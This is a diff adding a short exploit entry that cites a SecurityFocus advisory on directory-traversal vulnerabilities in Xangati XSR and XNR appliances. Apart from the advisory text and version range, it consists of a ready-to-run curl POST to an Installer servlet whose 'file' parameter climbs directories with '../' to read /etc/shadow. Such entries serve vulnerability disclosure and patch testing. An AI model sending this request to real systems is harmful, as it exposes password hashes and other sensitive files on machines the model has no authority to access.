@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/66817/info
+ 
+Xangati XSR And XNR are prone to a multiple directory-traversal vulnerabilities.
+ 
+A remote attacker could exploit these vulnerabilities using directory-traversal characters ('../') to access or read arbitrary files that contain sensitive information.
+ 
+Xangati XSR prior to 11 and XNR prior to 7 are vulnerable. 
+
+curl -i -s -k  -X 'POST' \
+-H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Java/1.7.0_25' \
+--data-binary $'key=validkey&falconConfig=getfile&file=%2Ffloodguard%2F../../../../../../../../../etc/shadow' \
+'hxxps://www.example.com/servlet/Installer'
